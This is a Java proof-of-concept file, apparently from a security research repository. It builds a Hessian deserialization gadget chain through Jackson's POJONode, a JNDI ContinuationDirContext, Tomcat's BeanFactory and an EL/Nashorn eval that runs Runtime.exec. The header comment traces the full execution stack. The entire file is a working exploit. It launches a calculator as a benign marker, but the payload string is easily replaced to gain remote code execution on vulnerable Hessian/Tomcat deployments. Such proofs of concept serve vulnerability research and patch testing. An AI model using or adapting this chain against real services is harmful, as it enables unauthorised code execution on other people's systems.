package com.javasec.pocs.hessian;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import org.apache.naming.ResourceRef;

import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

/**
 * exec:347, Runtime (java.lang)
 * invokeVirtual_LL_L:-1, 1260217713 (java.lang.invoke.LambdaForm$DMH)
 * reinvoke:-1, 397071633 (java.lang.invoke.LambdaForm$BMH)
 * exactInvoker:-1, 443290224 (java.lang.invoke.LambdaForm$MH)
 * linkToCallSite:-1, 413218476 (java.lang.invoke.LambdaForm$MH)
 * :program:1, Script$\^eval\_ (jdk.nashorn.internal.scripts)
 * invokeStatic_LL_L:-1, 2130772866 (java.lang.invoke.LambdaForm$DMH)
 * invokeExact_MT:-1, 37981645 (java.lang.invoke.LambdaForm$MH)
 * invoke:640, ScriptFunctionData (jdk.nashorn.internal.runtime)
 * invoke:228, ScriptFunction (jdk.nashorn.internal.runtime)
 * apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)
 * evalImpl:446, NashornScriptEngine (jdk.nashorn.api.scripting)
 * evalImpl:403, NashornScriptEngine (jdk.nashorn.api.scripting)
 * evalImpl:399, NashornScriptEngine (jdk.nashorn.api.scripting)
 * eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)
 * eval:264, AbstractScriptEngine (javax.script)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invoke:147, BeanELResolver (javax.el)
 * invoke:79, CompositeELResolver (javax.el)
 * getValue:158, AstValue (org.apache.el.parser)
 * getValue:189, ValueExpressionImpl (org.apache.el)
 * getValue:61, ELProcessor (javax.el)
 * eval:54, ELProcessor (javax.el)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * getObjectInstance:210, BeanFactory (org.apache.naming.factory)
 * getObjectInstance:321, NamingManager (javax.naming.spi)
 * getContext:439, NamingManager (javax.naming.spi)
 * getTargetContext:55, ContinuationContext (javax.naming.spi)
 * getEnvironment:197, ContinuationContext (javax.naming.spi)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
 * serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
 * serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
 * defaultSerializeValue:1148, SerializerProvider (com.fasterxml.jackson.databind)
 * serialize:115, POJONode (com.fasterxml.jackson.databind.node)
 * serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * _writeValueAndClose:4624, ObjectMapper (com.fasterxml.jackson.databind)
 * writeValueAsBytes:3892, ObjectMapper (com.fasterxml.jackson.databind)
 * valueToBytes:51, InternalNodeMapper (com.fasterxml.jackson.databind.node)
 * from:38, NodeSerialization (com.fasterxml.jackson.databind.node)
 * writeReplace:28, BaseJsonNode (com.fasterxml.jackson.databind.node)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * writeReplace:184, WriteReplaceSerializer (com.caucho.hessian.io)
 * writeObject:155, WriteReplaceSerializer (com.caucho.hessian.io)
 * writeObject:465, Hessian2Output (com.caucho.hessian.io)
 * HessianTostringSerial:216, SerializeUtils (com.javasec.utils)
 * main:26, HessianJackElChain (com.javasec.pocs.hessian)
 */
public class HessianJackElChain {
    public static void main(String[] args) throws Exception {
        //embed 9.0.69以下,EL
        SerializeUtils.OverideJackson();
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "pupi1=eval"));
        resourceRef.add(new StringRefAddr("pupi1", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\""+ "java.lang.Runtime.getRuntime().exec('calc');" +"\")"));
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(resourceRef);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        POJONode jsonNodes = new POJONode(ctx);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(jsonNodes));
    }
}
